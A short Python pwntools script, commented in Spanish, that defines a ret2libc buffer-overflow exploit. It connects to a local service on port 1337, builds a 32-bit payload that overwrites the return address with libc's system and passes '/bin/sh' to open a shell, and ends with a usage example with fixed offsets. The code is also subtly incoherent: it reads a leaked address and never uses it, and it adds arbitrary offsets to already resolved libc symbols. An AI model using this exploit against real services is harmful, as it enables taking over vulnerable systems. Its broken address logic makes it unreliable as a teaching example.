from pwn import *

'''
Funcción para explotar vulnerabilidades
del tipo ret2libc.
'''

def ret2libc_exploit(binary_path, libc_path, system_offset, binsh_offset):
    binary = ELF(binary_path)
    libc = ELF(libc_path)

    system_addr = libc.sym['system'] + system_offset
    binsh_addr = next(libc.search(b'/bin/sh')) + binsh_offset
    main_addr = binary.sym['main']

    io = remote('localhost', 1337)

    io.sendline(b'A' * 32)
    buf = io.recvline().strip()
    addr = int(buf, 16)

    ret_addr = p32(system_addr)
    arg_addr = p32(binsh_addr)

    payload = b''
    payload += b'A' * 28
    payload += ret_addr
    payload += b'B' * 4
    payload += arg_addr

    io.sendline(payload)
    io.recvline()
    io.close()

'''
Ejemplo de uso:

ret2libc_exploit('vulnerable_bin', 'libc.so.6', 0x03ada0, 0x17b8cf)
'''